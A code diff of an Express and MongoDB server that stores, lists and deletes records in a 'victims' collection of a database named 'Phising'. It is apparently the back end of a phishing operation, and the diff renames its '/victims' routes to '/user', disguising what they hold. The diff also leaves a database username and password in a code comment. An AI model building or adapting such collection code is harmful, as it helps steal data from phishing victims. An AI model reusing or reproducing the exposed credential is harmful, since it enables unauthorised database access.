@@ -3,6 +3,8 @@ const cors = require('cors');
 const app = express();
 const port = process.env.port || 5000;
 const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');
+require('dotenv').config()
+ 
 
 
  
@@ -16,9 +18,9 @@ app.use(express.json());
 
 
 
-const uri = "mongodb+srv://Phising:SzA198qdUDXgYMHQ@cluster0.wss65wz.mongodb.net/?retryWrites=true&w=majority";
+const uri = `mongodb+srv://${process.env.DBUser}:${process.env.DBPass}@cluster0.wss65wz.mongodb.net/?retryWrites=true&w=majority`;
 // console.log(uri);
-// Create a MongoClient with a MongoClientOptions object to set the Stable API version
+// Create a MongoClient Phising with a MongoClientOptions SzA198qdUDXgYMHQ object to set the Stable API version
 const client = new MongoClient(uri, {
      serverApi: {
           version: ServerApiVersion.v1,
@@ -32,13 +34,13 @@ async function run() {
 
           const victimsCollection = client.db('Phising').collection('victims');
 
-          app.post('/victims', async (req, res) => {
+          app.post('/user', async (req, res) => {
                const post = req.body;
                const result = await victimsCollection.insertOne(post);
                res.send(result);
           })
 
-          app.get('/victims', async (req, res) => {
+          app.get('/user', async (req, res) => {
 
                const query = {};
                const result = await victimsCollection.find(query).toArray();
@@ -46,7 +48,7 @@ async function run() {
 
           })
 
-          app.delete('/victims/:id', async (req, res) => {
+          app.delete('/user/:id', async (req, res) => {
                const id = req.params.id;
                const filter = { _id: new ObjectId(id) }
                const result = await victimsCollection.deleteOne(filter)
